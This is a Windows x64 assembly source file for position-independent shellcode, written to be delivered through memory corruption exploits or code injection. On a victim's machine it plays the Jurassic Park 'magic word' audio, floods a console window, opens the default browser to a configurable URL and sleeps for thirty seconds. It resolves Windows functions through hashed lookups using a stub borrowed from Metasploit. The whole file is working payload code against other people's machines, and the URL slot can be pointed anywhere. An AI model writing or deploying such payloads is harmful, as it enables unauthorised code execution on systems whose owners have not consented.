[bits 64]
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; Win x86-64 shellcode to recreate the Jurassic Park hacking scene on the victim's machine. This 
;;; payload is position independent and can be used with most memory corruption exploits or for
;;; code injection. It does contain null bytes (can't get around that because of the embedded WAV).
;;; If you require no nulls, you'll have to encode it.
;;;
;;; - Plays the 'Ah, ah, ah... you didn't say the magic word' audio
;;; - Opens up a command prompt and floods "YOU DIDN'T SAY THE MAGIC WORD" output
;;; - Opens the victims default browser to a web page meant to host the Nedry GIF
;;; - Sleeps for 30 seconds for extra torment factor
;;;
;;; Tested on Windows 10 x64 Fall Creators Update. Should run on any Windows x64 OS.
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;; Clear the direction flag and call/pop to load the address for api_call into rbp
start:
    cld                             ; clear direction flag
    and rsp, 0xfffffffffffffff0     ; Ensure RSP is 16 byte aligned
    call setup_console              ; call/pop to get addr of api_call in rbp

;;; Stub debo'd from Metasploit that iterates the kernel32 EAT until it finds a function name
;;; matching the supplied hash. It then tail calls into the procedure address.
%include "./api.asm"

;;; Open a console window (if not already running inside of a console app) and get a console handle
setup_console:
    pop rbp                     ; address of api_call
    mov r10d, 0xd975e69d        ; hash for kernel32!AllocConsole
    call rbp                    ; lookup hash and call AllocConsole
    mov rcx, -11                ; STD_OUTPUT_HANDLE
    mov r10d, 0x53cabb18        ; hash for kernel32!GetStdHandle
    call rbp                    ; lookup hash and call GetStdHandle
    call flood_message          ; call/pop to get addr of output

command:
    db "YOU DIDN'T SAY THE MAGIC WORD!", 0x0a

;;; Pop off the address of the message above and output the message to the console 50 times
flood_message:
    mov r12, rax                ; preserve handle to console
    pop r13                     ; pointer to message text
    mov rdi, 0x32               ; loop fitty times
message_loop:
    mov rcx, r12                ; HANDLE hConsoleOutput
    mov rdx, r13                ; VOID lpBuffer
    mov r8, 0x1f                ; DWORD nNumberOfCharsToWrite
    xor r9, r9                  ; NumberOfCharsWritten
    sub rsp, 0x8                ; call_api allocs for 4 params - alloc another 8 for 5th param
    mov qword [rsp+0x20], rax     ; LPVOID lpReserved
    mov r10d, 0x5dcb5d71        ; hash for kernel32!WriteConsoleA
    call rbp                    ; lookup hash and call WriteConsoleA
    add rsp, 0x8                ; re-align
    dec rdi                     ; decrement loop counter (also sets ZF)
    jnz message_loop            ; if rdi != 0 do it again

;;; Load winmm.dll using LoadLibrary API
load_winmm:
    mov rcx, 0x000000000000006c ; push winmm.dll to stack
    push rcx                    ; ..
    mov rcx, 0x6c642e6d6d6e6977 ; ..
    push rcx                    ; ..
    mov rcx, rsp                ; LPCTSTR lpFileName
    mov r10d, 0x0726774C        ; hash for kernel32!LoadLibraryA
    call rbp                    ; lookup hash and call LoadLibraryA

;;; Get address for PlaySound procedure using GetProcAddress
get_playsound_addr:
    mov rcx, rax                ; HMODULE hModule
    mov rdx, 0x0000000000000064 ; push 'PlaySound' to the stack
    push rdx                    ; ..
    mov rdx, 0x6e756f5379616c50 ; ..
    push rdx                    ; ..
    mov rdx, rsp                ; LPCSTR lpProcName
    mov r10d, 0x7802f749        ; hash for kernel32!GetProcAddress
    call rbp                    ; lookup hash and call GetProcAddress
    mov r14, rax                ; preserve addr of PlaySound in r14
    jmp call_load_wav           ; jmp/call/pop to get addr of WAV buffer

;;; Load the WAV file from memory and play it asynchronously
load_wav:
    pop rcx                     ; LPCTSTR pszSound - pointer to WAV buffer
    sub rsp, 0x20               ; shadow space
    xor rdx, rdx                ; HMODULE hmod
    mov r8, 0x000000000000000d  ; DWORD fdwSound - SND_MEMORY (4) | SND_ASYNC (1) | SND_LOOP (8)
    call rax                    ; call PlaySound
    add rsp, 0x20               ; re-align

;;; Load shell32.dll
load_shell32:
    mov rcx, 0x00000000006c6c64 ; push 'shell32.dll' to stack
    push rcx                    ; ..
    mov rcx, 0x2e32336c6c656873 ; ..
    push rcx                    ; ..
    mov rcx, rsp                ; LPCTSTR lpFileName
    mov r10d, 0x0726774C        ; hash for kernel32!LoadLibraryA
    call rbp                    ; lookup hash and call LoadLibraryA

;;; Get address for ShellExecuteA procedure using GetProcAddress
get_shellexecutea_addr:
    mov rcx, rax                ; HMODULE hModule
    mov rdx, 0x0000004165747563 ; push 'ShellExecuteA' to the stack
    push rdx                    ; ..
    mov rdx, 0x6578456c6c656853 ; ..
    push rdx                    ; ..
    mov rdx, rsp                ; LPCSTR lpProcName
    mov r10d, 0x7802f749        ; hash for kernel32!GetProcAddress
    call rbp                    ; lookup hash and call GetProcAddress
    call pop_nedry              ; call/pop to get addr for nedry URL

;;; Placeholder for up-to 64 character URL for Nedry GIF page
nedry_url:
    db 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
    db 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
    db 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
    db 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0

;;; Open the target's default browser and point it to the URL hosting Nedry HTML
pop_nedry:
    xor rcx, rcx                ; HWND hwnd
    pop r8                      ; LPCTSTR lpFile
    mov rdx, 0x000000006e65706f ; push 'open' to the stack
    push rdx                    ; ..
    mov rdx, rsp                ; LPCTSTR lpOperation
    xor r9, r9                  ; lpParameters
    sub rsp, 0x38               ; f*cking shadow space
    xor r11, r11                ; LPCTSTR lpParameters
    mov qword [rsp+32], r11     ; LPCTSTR lpDirectory
    mov qword [rsp+40], 0x1     ; INT nShowCmd (SW_SHOWNORMAL)
    call rax                    ; call ShellExecuteA
    add rsp, 0x38               ; re-align

;;; Sleep for 30 seconds while the audio plays
sleep_while_tormenting_target:
    mov rcx, 0x7530             ; DWORD dwMilliseconds
    mov r10d, 0xe035f044        ; hash for kernel32!Sleep
    call rbp                    ; lookup hash and call Sleep

;;; Unload the WAV file and terminate the audio
stop_wav:
    sub rsp, 0x20               ; shadow space
    xor rcx, rcx                ; LPCTSTR pszSound - pointer to WAV buffer
    xor rdx, rdx                ; HMODULE hmod
    xor r8, r8                  ; DWORD fdwSound
    call r14                    ; call PlaySound
    add rsp, 0x20               ; re-align

;;; Reset stack and return (thrown off by shadow alignment by api_call and string pushes)
cleanup:
    add rsp, 0x770              ; restore the stack
    ret                         ; return

;;; Call/pop to get address of the WAV buffer for load_wav
call_load_wav:
    call load_wav               ; call/pop to get addr of WAV buffer

;;; From here on down is the WAV file data
incbin "../resources/magicwrd.wav"